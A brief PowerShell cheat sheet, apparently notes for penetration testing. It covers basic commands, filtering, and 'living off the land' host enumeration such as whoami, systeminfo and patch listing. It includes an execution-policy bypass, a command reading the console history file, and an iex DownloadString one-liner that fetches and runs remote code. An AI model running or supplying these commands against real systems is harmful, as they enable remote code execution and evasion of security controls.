
Powershell commands are usually written in pascal case with hyphen, but can be written in lowercase.
Additionally, there are often much shorter aliases for commands, check them with `alias` or `alias | where name like "<my-command>"`
### Basic
- `Get-Module`: List available modules
- `Get-ExecutionPolicy -List`
- `Set-ExecutionPolicy Bypass -Scope Process`
- `Get-ChildItem Env: | ft Key,Value`: check environment variables
- `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`: check history
- `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"`: download file

### Filtering & Selection
Objects from commands are usually returned with a first row containing field names.
These field names can be printed with `Get-Member`

- `| Select-Object <field name> -<operation> <field value`: where operation can be eq, like, gt, lt, ...
- `| Where ...`

### Enumeration Commands
Commands useful when LOTL:
- `hostname`
- `wmic qfe get Caption,Description,HotFixID,InstalledOn`: Prints the patches and hotfixes applied to the host
- `ipconfig /all`
- `whoami /all`
- `set`: Display list of environment variables
- `echo %USERDOMAIN%`
- `echo %logonserver%`
- `systeminfo`
- `Get-Host`